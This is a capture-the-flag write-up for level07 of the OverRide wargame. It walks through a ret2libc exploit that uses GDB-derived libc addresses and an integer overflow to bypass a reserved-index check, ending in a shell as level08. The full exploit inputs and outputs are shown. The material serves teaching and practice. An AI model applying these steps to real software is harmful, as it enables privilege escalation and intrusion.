Here, the NX bit is enabled, so we cannot execute code from the stack.

However, the binary is not compiled with PIE, and ASLR is only partially enabled, so we can still perform a ret2libc attack.

Here are the required addresses, that I retrieved using GDB:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system> <==== To overwrite the return address of the main function
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit> <==== To overwrite the return address of the system function
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh" <==== To overwrite the first argument of system
```

First we need to find a way to load these addresses in memory at the correct places to execute the exploit.

We have access to a buffer inside of the main function, we just need to find its offset from the return address.

Using GDB, I compare the address of the buffer and the address of the return address:

```
(gdb) x/x $ebp+0x8
0xffffda40:     0xffffda64 <==== First address is where the int array is stored, second address is the address of the first index of the array itself
(gdb) b *main+520
(gdb) r
...
(gdb) i f
...
 Saved registers:
  ebx at 0xffffdc1c, ebp at 0xffffdc28, esi at 0xffffdc20, edi at 0xffffdc24, eip at 0xffffdc2c <==== Address of the EIP
(gdb) print 0xffffdc2c - 0xffffda64
$1 = 456
(gdb) print 456 / 4
$2 = 114 <==== Index of EIP in the array
```

Now let's prepare the exploit:

0xf7e6aed0 = 4159090384 (system address converted to decimal)
0xf7f897ec = 4160264172 ("/bin/sh" address converted to decimal)

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Ah! Index 114 is reserved for wil! We need to find another way to access this index. I think I can use an int overflow to access this index.

114 + (UINT_MAX / 4) = 1073741938

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

Bingo! We got a shell as level08!
